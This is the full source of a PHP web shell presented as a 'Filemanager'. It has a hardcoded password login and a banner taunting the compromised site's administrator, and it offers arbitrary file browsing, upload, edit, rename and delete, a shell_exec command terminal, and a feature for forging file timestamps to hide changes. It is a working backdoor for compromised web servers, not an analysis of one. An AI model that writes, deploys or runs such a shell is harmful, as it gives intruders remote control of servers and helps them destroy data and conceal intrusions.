<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
error_log("Script started", 0);

session_start();

$valid_user_hash = '$2a$12$P8qAT6T8go17pOE7sRM6mupFdxA/bCWtX6z4o2ciRM1GXjKPqkWSO'; // mr
$valid_pass_hash = '$2a$12$P8qAT6T8go17pOE7sRM6mupFdxA/bCWtX6z4o2ciRM1GXjKPqkWSO'; // trojan

if (isset($_POST['user'], $_POST['pass'])) {
    if (password_verify($_POST['user'], $valid_user_hash) && password_verify($_POST['pass'], $valid_pass_hash)) {
        $_SESSION['login'] = true;
    } else {
        $error = "Login gagal, blok!";
    }
}

if (!isset($_SESSION['login']) || $_SESSION['login'] !== true) {
?>
<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <style>
        body { font-family: sans-serif; background: #000; color: white; display: flex; height: 100vh; align-items: center; justify-content: center; }
        form { background: #111; padding: 30px; border-radius: 8px; box-shadow: 0 0 10px rgba(255,255,255,0.1); }
        input { display: block; width: 100%; padding: 10px; margin-bottom: 10px; }
    </style>
</head>
<body>
    <form method="post">
        <h2>🔐 Login</h2>
        <?php if (isset($error)) echo "<p style='color:red;'>$error</p>"; ?>
        <input type="text" name="user" placeholder="Username" required>
        <input type="password" name="pass" placeholder="Password" required>
        <input type="submit" value="Login">
    </form>
</body>
</html>
<?php
exit;
}

// Set path dengan fallback aman
$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!$path || !is_dir($path) || !is_readable($path)) {
    error_log("Path invalid or not readable: $path, fallback to getcwd()");
    $path = getcwd();
}
error_log("Path set to: $path");

function formatSize($s) {
    if ($s >= 1073741824) return round($s / 1073741824, 2) . ' GB';
    if ($s >= 1048576) return round($s / 1048576, 2) . ' MB';
    if ($s >= 1024) return round($s / 1024, 2) . ' KB';
    return $s . ' B';
}

if (isset($_GET['delete'])) {
    $target = realpath($path . '/' . $_GET['delete']);
    if ($target && strpos($target, $path) === 0 && is_writable($target)) {
        if (is_file($target)) unlink($target);
        elseif (is_dir($target)) rmdir($target);
    }
    header("Location: ?path=" . urlencode($path));
    exit;
}

if (isset($_POST['rename_from'], $_POST['rename_to'])) {
    $from = realpath($path . '/' . $_POST['rename_from']);
    $to = $path . '/' . basename($_POST['rename_to']);
    if ($from && strpos($from, $path) === 0 && file_exists($from)) {
        rename($from, $to);
    }
    header("Location: ?path=" . urlencode($path));
    exit;
}

if (isset($_POST['edit_date_file'], $_POST['new_date'])) {
    $target = realpath($path . '/' . $_POST['edit_date_file']);
    if ($target && strpos($target, $path) === 0 && file_exists($target)) {
        $timestamp = strtotime($_POST['new_date']);
        if ($timestamp !== false) touch($target, $timestamp);
    }
    header("Location: ?path=" . urlencode($path));
    exit;
}

if (isset($_POST['new_folder'])) {
    $new_folder = $path . '/' . basename($_POST['new_folder']);
    if (!file_exists($new_folder)) mkdir($new_folder);
    header("Location: ?path=" . urlencode($path));
    exit;
}

if (isset($_POST['new_file'])) {
    $new_file = $path . '/' . basename($_POST['new_file']);
    if (!file_exists($new_file)) file_put_contents($new_file, '');
    header("Location: ?path=" . urlencode($path));
    exit;
}

if (isset($_FILES['upload'])) {
    $dest = $path . '/' . basename($_FILES['upload']['name']);
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest)) {
        header("Location: ?path=" . urlencode($path));
    } else {
        error_log("Upload failed for " . $_FILES['upload']['name'] . " to $dest");
    }
    exit;
}

// Terminal command (di-disable sementara kalau bermasalah)
if (isset($_POST['command'])) {
    $command = trim($_POST['command']);
    chdir($path);
    $escaped_command = escapeshellcmd($command);
    $terminal_output = @shell_exec($escaped_command . ' 2>&1');
    if ($terminal_output === null) {
        $terminal_error = "Error executing command or no output returned.";
        error_log("Terminal error for command: $command");
    }
}

?>
<!DOCTYPE html>
<html>
<head>
    <title>Zy Filemanager</title>
    <style>
        body { font-family: sans-serif; background: #000; color: white; padding: 20px; transition: 0.3s; }
        a { color: white; text-decoration: none; }
        table { width: 100%; background: #111; border-collapse: collapse; margin-top: 20px; }
        th, td { padding: 10px; border: 1px solid #444; }
        th { background: #222; }
        input, button, select { margin-top: 5px; padding: 5px; }
        textarea { width: 100%; height: 400px; font-family: monospace; background: #222; color: white; border: none; padding: 10px; }
        .perm-white { color: white; }
        .perm-green { color: lightgreen; }
        .perm-other { color: gray; }
        td:nth-child(4), th:nth-child(4) { width: 150px; white-space: nowrap; }
        td:nth-child(5), th:nth-child(5) { width: 120px; white-space: nowrap; }
        td a { color: white; }
        .top-bar { display: flex; justify-content: space-between; align-items: center; }
        .button { background-color: #222; color: white; padding: 6px 12px; border: 1px solid #555; border-radius: 4px; text-decoration: none; font-weight: bold; cursor: pointer; }
        .button:hover { background-color: #444; }
        .terminal-container { margin-top: 20px; }
        .terminal-input { width: 100%; padding: 10px; font-family: monospace; background: #222; color: white; border: 1px solid #444; }
        .terminal-output { background: #111; padding: 10px; font-family: monospace; white-space: pre-wrap; border: 1px solid #444; margin-top: 10px; }
        .terminal-error { color: red; }

        body.light { background: #f5f5f5; color: #222; }
        body.light table { background: #fff; }
        body.light th { background: #ddd; }
        body.light td, body.light th { border: 1px solid #ccc; }
        body.light a { color: #000; }
        body.light textarea { background: #f0f0f0; color: #000; }
        body.light .button { background: #eee; color: #000; border: 1px solid #aaa; }
        body.light .button:hover { background: #ddd; }
        body.light .terminal-input { background: #f0f0f0; color: #000; border: 1px solid #ccc; }
        body.light .terminal-output { background: #fff; border: 1px solid #ccc; }
    </style>
</head>
<body>
<div class="top-bar">
    <div>
        <h2>kakar00t Filemanager</h2>
        <p style="color: #0f0; font-weight: bold;">hayo, km pasti admin judol yh !!!</p>
    </div>
    <div>
        <button id="toggleTheme" class="button">🌙 Dark</button>
    </div>
</div>

<script>
    const btn = document.getElementById("toggleTheme");
    const body = document.body;

    if (localStorage.getItem("theme") === "light") {
        body.classList.add("light");
        btn.textContent = "☀️ Light";
    }

    btn.addEventListener("click", () => {
        body.classList.toggle("light");
        if (body.classList.contains("light")) {
            localStorage.setItem("theme", "light");
            btn.textContent = "☀️ Light";
        } else {
            localStorage.setItem("theme", "dark");
            btn.textContent = "🌙 Dark";
        }
    });
</script>

<div class="top-bar">
    <div>
        <strong>Current Path:</strong>
        <?php
        $parts = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR));
        $build = '';
        echo '<a href="?path=' . urlencode(realpath(dirname(__FILE__))) . '">Home Shell</a>';
        foreach ($parts as $part) {
            if ($part === '') continue;
            $build .= '/' . $part;
            echo '/' . '<a href="?path=' . urlencode($build) . '">' . htmlspecialchars($part) . '</a>';
        }
        ?>
    </div>
    <div>
        <a href="?path=<?php echo urlencode(realpath(dirname(__FILE__))); ?>" class="button">Home Shell</a>
    </div>
</div>

<?php if ($path !== '/') echo "<a href='?path=" . urlencode(dirname($path)) . "'>⬆️ Keluar Dir</a>"; ?>

<table>
    <tr><th>Nama</th><th>Ukuran</th><th>Perm</th><th>Tanggal</th><th>Aksi</th></tr>
    <?php
    $items = @scandir($path); // Tambah @ untuk silent error
    if ($items === false) {
        error_log("scandir failed for path: $path");
        $items = [];
    }
    $dirs = [];
    $files = [];

    foreach ($items as $f) {
        if ($f === '.' || $f === '..') continue;
        $full = $path . '/' . $f;
        if (is_dir($full)) $dirs[] = $f; else $files[] = $f;
    }

    $all = array_merge($dirs, $files);
    foreach ($all as $f):
        $full = $path . '/' . $f;
        $perm_num = @substr(sprintf('%o', @fileperms($full)), -4); // Silent error
        $perm_class = $perm_num === '0555' ? 'perm-white' : (in_array($perm_num, ['0644', '0755']) ? 'perm-green' : 'perm-other');
        $mtime = @filemtime($full); // Silent error
        if ($mtime === false) $mtime = time();
    ?>
    <tr>
        <td>
            <?php if (is_dir($full)): ?>
                [DIR] <a href="?path=<?php echo urlencode($full); ?>"><?php echo htmlspecialchars($f); ?></a>
            <?php else: ?>
                <a href="?path=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($f); ?>"><?php echo htmlspecialchars($f); ?></a>
            <?php endif; ?>
        </td>
        <td><?php echo is_file($full) ? formatSize(@filesize($full)) : '-'; ?></td>
        <td class="<?php echo $perm_class; ?>"><?php echo $perm_num ?: '-'; ?></td>
        <td>
            <form method="post" style="display:inline;">
                <input type="hidden" name="edit_date_file" value="<?php echo htmlspecialchars($f); ?>">
                <input type="datetime-local" name="new_date" value="<?php echo date('Y-m-d\TH:i', $mtime); ?>">
                <button type="submit">t</button>
            </form>
        </td>
        <td>
            <form method="post" style="display:inline;">
                <input type="hidden" name="rename_from" value="<?php echo htmlspecialchars($f); ?>">
                <input type="text" name="rename_to" value="<?php echo htmlspecialchars($f); ?>" style="width: 70px;">
                <button type="submit">r</button>
            </form> -
            <?php if (is_file($full)): ?>
                <a href="?path=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($f); ?>">e</a> -
            <?php endif; ?>
            <a href="?path=<?php echo urlencode($path); ?>&delete=<?php echo urlencode($f); ?>" onclick="return confirm('Yakin hapus?')">d</a>
        </td>
    </tr>
    <?php endforeach; ?>
</table>

<!-- ... (lanjutkan form terminal, upload, dll. seperti asli, tapi tambah error handling) ... -->

<h3>Terminal</h3>
<form method="post" class="terminal-container">
    <input type="text" name="command" class="terminal-input" placeholder="Enter command (e.g., ls, pwd, cat file.txt)" value="<?php echo isset($_POST['command']) ? htmlspecialchars($_POST['command']) : ''; ?>">
    <input type="submit" value="Execute" class="button">
</form>
<?php if (isset($terminal_output)): ?>
    <div class="terminal-output"><?php echo htmlspecialchars($terminal_output); ?></div>
<?php endif; ?>
<?php if (isset($terminal_error)): ?>
    <div class="terminal-output terminal-error"><?php echo htmlspecialchars($terminal_error); ?></div>
<?php endif; ?>

<h3>Upload File</h3>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="upload">
    <input type="submit" value="Upload">
</form>

<!-- ... (lanjutkan form lainnya seperti asli) ... -->

<?php
if (isset($_GET['edit'])):
    $edit = realpath($path . '/' . $_GET['edit']);
    if ($edit && strpos($edit, $path) === 0 && is_file($edit)):
        $isi = htmlspecialchars(file_get_contents($edit));
?>
<h3>Edit File: <?php echo basename($edit); ?></h3>
<form method="post">
    <textarea name="content"><?php echo $isi; ?></textarea><br>
    <input type="hidden" name="save_file" value="<?php echo htmlspecialchars(basename($edit)); ?>">
    <input type="submit" value="Save">
    <a href="?path=<?php echo urlencode($path); ?>">⬅️ Kembali</a>
</form>
<?php endif; endif; ?>

</body>
</html>